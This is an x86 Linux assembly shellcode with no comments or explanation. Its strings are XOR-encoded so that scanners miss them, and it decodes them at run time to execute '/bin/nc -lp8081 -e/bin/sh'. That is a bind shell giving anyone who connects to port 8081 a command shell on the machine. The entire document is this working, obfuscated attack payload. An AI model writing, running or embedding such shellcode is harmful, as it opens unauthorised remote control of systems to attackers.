global _start

section .text
  _start:
    mov   edi, 0x01010101
    mov   ecx, edi
    xor   ecx, edi

    push  0x01010169
    push  0x722e6f68
    push  0x632e642c
    push  0x01303931
    push  0x39716d2c
    push  0x01626f2e
    push  0x6f68632e
    push  edi

    mov   cl, 0x8
    mov   bl, 0x4

  decode:
    mov   eax, ecx
    sub   eax, 0x1
    mul   ebx
    xor   [esp + eax], edi
    loop  decode

    mov   al, 0xc
    sub   al, 0x1
    lea   ebx, [esp + 0x4]
    lea   edx, [ebx + 0x8]
    push  edx
    lea   edx, [ebx + 0x10]
    push  edx
    push  ebx
    lea   ecx, [esp]
    xor   edx, edx
    int   0x80
